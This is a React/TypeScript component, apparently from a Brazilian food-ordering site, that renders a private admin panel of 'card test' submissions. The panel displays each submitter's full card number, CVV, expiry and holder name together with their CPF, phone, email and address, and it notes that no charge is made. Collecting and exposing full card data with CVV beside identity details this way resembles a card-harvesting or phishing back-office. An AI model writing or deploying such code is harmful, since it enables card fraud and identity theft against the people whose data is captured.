import { useServerFn } from "@tanstack/react-start";
import { useEffect, useState } from "react";
import { ChevronLeft, ChevronRight, Trash2, CreditCard, Fingerprint, MapPin, Mail, Phone, RefreshCw, ShoppingBag } from "lucide-react";
import { CardPreview } from "@/components/CardFields";
import { deleteCardTests, readCardTests } from "@/lib/private-access.functions";
import { brl } from "@/lib/menu";
import type { CardBrand } from "@/lib/card";

type Row = { id: string; created_at: string; menu_path: string; amount_cents: number; details: string };
type Form = Partial<Record<"name" | "phone" | "email" | "cpf" | "street" | "number" | "complement" | "neighborhood" | "city" | "state" | "cep" | "reference", string>>;
type Details = { form?: Form; items?: { qty: number; name: string }[]; card?: { brand: CardBrand; last4: string; owner: string; expiresAt: string; cvvInformed: boolean; sandbox?: boolean; number?: string; cvv?: string } };

const when = (iso: string) => new Intl.DateTimeFormat("pt-BR", { timeZone: "America/Sao_Paulo", day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit" }).format(new Date(iso));
const initials = (name = "") => name.trim().split(/\s+/).slice(0, 2).map(p => p[0]?.toUpperCase() ?? "").join("") || "?";

function Entry({ row, onDelete }: { row: Row; onDelete: () => void }) {
  const d = JSON.parse(row.details) as Details;
  const f = d.form ?? {};
  const [flipped, setFlipped] = useState(false);
  const c = d.card;
  const line1 = [f.street, f.number, f.complement].filter(Boolean).join(", ");
  const line2 = [f.neighborhood, [f.city, f.state].filter(Boolean).join(" - ")].filter(Boolean).join(" · ");
  return <article className="pv-entry">
    <header className="pv-entry-head">
      <span className="pv-pill">{row.menu_path === "/sushi" ? "Sushi" : "Lanches"}</span>
      <span className="pv-when">{when(row.created_at)}</span>
      <strong className="pv-amount">{brl(row.amount_cents / 100)}</strong>
      <button type="button" className="pv-btn" onClick={onDelete} aria-label="Apagar este envio"><Trash2 /></button>
    </header>
    <div className="pv-entry-grid">
      {c && <div className="pv-slot">
        <button type="button" className="pv-card-btn" onClick={() => setFlipped(v => !v)} aria-label="Virar cartão">
          <CardPreview card={{ number: c.number ?? "", owner: c.owner, expiresAt: c.expiresAt, cvv: c.cvv ?? (c.cvvInformed ? "•••" : "") }} flipped={flipped} focus={null} brandOverride={c.brand} showCvv {...(c.number ? {} : { last4: c.last4 })} />
        </button>
        <p className="pv-caption">{c.number ? <>Completo · {c.number.replace(/(\d{4})(?=\d)/g, "$1 ")} · CVV {c.cvv} · {c.expiresAt}</> : <>Real (mascarado) · Final {c.last4} · CVV {c.cvvInformed ? "informado" : "não informado"}</>} · toque para virar</p>
      </div>}
      <div className="pv-slot pv-id">
        <div className="pv-id-top"><Fingerprint /><span>Ficha do cliente</span><small>Não é documento oficial</small></div>
        <div className="pv-id-body">
          <span className="pv-avatar" aria-hidden="true">{initials(f.name)}</span>
          <dl>
            <div><dt>Nome</dt><dd>{f.name || "—"}</dd></div>
            <div><dt>CPF</dt><dd className="pv-mono">{f.cpf || "—"}</dd></div>
          </dl>
        </div>
        <ul className="pv-id-contacts">
          <li><Phone />{f.phone || "—"}</li>
          <li><Mail />{f.email || "—"}</li>
        </ul>
      </div>
      <div className="pv-slot pv-info">
        <h3><MapPin />Entrega</h3>
        <p>{line1 || "—"}</p><p>{line2}</p>
        <p className="pv-muted">CEP {f.cep || "—"}{f.reference ? ` · ${f.reference}` : ""}</p>
      </div>
      <div className="pv-slot pv-info">
        <h3><ShoppingBag />Pedido</h3>
        <ul>{d.items?.map((i, k) => <li key={k}><b>{i.qty}×</b> {i.name}</li>)}</ul>
      </div>
    </div>
  </article>;
}

export function PrivateCardTests() {
  const read = useServerFn(readCardTests);
  const [rows, setRows] = useState<Row[] | null>(null);
  const [error, setError] = useState("");
  const [busy, setBusy] = useState(false);
  const load = () => { setError(""); setBusy(true); void read().then(setRows).catch(() => setError("Não foi possível carregar os testes de cartão.")).finally(() => setBusy(false)); };
  useEffect(load, []);
  const del = useServerFn(deleteCardTests);
  const [page, setPage] = useState(0);
  const PER = 5;
  const pages = Math.max(1, Math.ceil((rows?.length ?? 0) / PER));
  const cur = Math.min(page, pages - 1);
  const shown = rows?.slice(cur * PER, cur * PER + PER) ?? [];
  const remove = (ids: string[], msg: string) => {
    if (!ids.length || !confirm(msg)) return;
    setBusy(true);
    void del({ data: { ids } }).then(() => setRows(r => r?.filter(x => !ids.includes(x.id)) ?? null)).catch(() => setError("Não foi possível apagar.")).finally(() => setBusy(false));
  };
  return <section className="pv-section" aria-label="Cartões">
    <div className="pv-section-head">
      <span className="pv-tile"><CreditCard /></span>
      <div><h2>Cartões</h2><p>{rows ? `${rows.length} ${rows.length === 1 ? "envio recebido" : "envios recebidos"}` : "Carregando…"} · sem cobrança</p></div>
      <button type="button" className="pv-btn" onClick={load} disabled={busy}><RefreshCw className={busy ? "animate-spin" : ""} />Atualizar</button>
    </div>
    <p className="pv-note">Número completo, CVV, bandeira, titular e validade são exibidos para todos os cartões.</p>
    {error && <p role="alert" className="mt-4 text-sm text-destructive">{error}</p>}
    {rows?.length === 0 && <div className="pv-empty"><CreditCard /><p>Nenhum teste recebido ainda.</p></div>}
    {shown.length > 0 && <div className="pv-section-head" style={{ marginTop: 12 }}>
      <button type="button" className="pv-btn" onClick={() => setPage(cur - 1)} disabled={cur === 0}><ChevronLeft />Anterior</button>
      <span className="pv-muted" style={{ flex: 1, textAlign: "center" }}>Página {cur + 1} de {pages}</span>
      <button type="button" className="pv-btn" onClick={() => setPage(cur + 1)} disabled={cur >= pages - 1}>Próxima<ChevronRight /></button>
      <button type="button" className="pv-btn" onClick={() => remove(shown.map(r => r.id), `Apagar os ${shown.length} envios desta página?`)} disabled={busy}><Trash2 />Apagar página</button>
    </div>}
    <div className="pv-list">{shown.map(r => <Entry key={r.id} row={r} onDelete={() => remove([r.id], "Apagar este envio?")} />)}</div>
  </section>;
}
